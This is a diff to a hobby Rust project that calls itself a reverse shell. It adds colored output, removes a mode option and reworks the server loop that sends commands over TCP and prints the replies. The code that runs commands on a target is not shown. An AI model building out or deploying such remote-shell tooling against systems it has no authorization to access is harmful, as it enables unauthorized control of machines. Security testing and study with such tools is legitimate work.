@@ -1,6 +1,7 @@
 use clap::Parser;
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream};
+use colored::Colorize;
 
 #[derive(Parser)]
 #[command(name = "rsh")]
@@ -8,8 +9,6 @@ use std::net::{TcpListener, TcpStream};
 #[command(version = "0.0.1")]
 #[command(about = "A Rust reverse shell", long_about = None)]
 struct Config {
-    ///Select the mode to operate on: client or server.
-    mode: String,
 	/// Port to operate on.
 	#[arg(default_value_t = 8080)]
 	port: i32,
@@ -38,13 +37,14 @@ fn receive(stream: &mut TcpStream) -> String {
 		let mut converted = String::from_utf8_lossy(&buffer).to_string();
 		converted = converted.replace("\0", "");
 
-
-		if converted == "MESSAGEDONE".to_string() {
-			println!("Breaking!");
+		// assert_eq!(converted, "MESSAGEDONE\n".to_string());
+		// hotfix...?
+		if converted.contains("MESSAGEDONE") {
+			println!("{}", "Breaking!".red());
 			break;
 		}
 
-		println!("pushed");
+		println!("{}", "pushed".green());
 		data.push_str(&converted.trim());
 	}
 
@@ -55,15 +55,9 @@ fn handle_client(mut stream: TcpStream) {
 	loop {
 		let command = get_command();
 		send_message(&mut stream, &command);
-		loop {
-			let mut data = receive(&mut stream);
-			data = data.replace("\0", "");
-
-			if data == "END" {
-				break;
-			}
-			println!("{}", data);
-		}
+		let mut data = receive(&mut stream);
+		data = data.replace("\0", "");
+		println!("{}", data);
 	}
 }
 
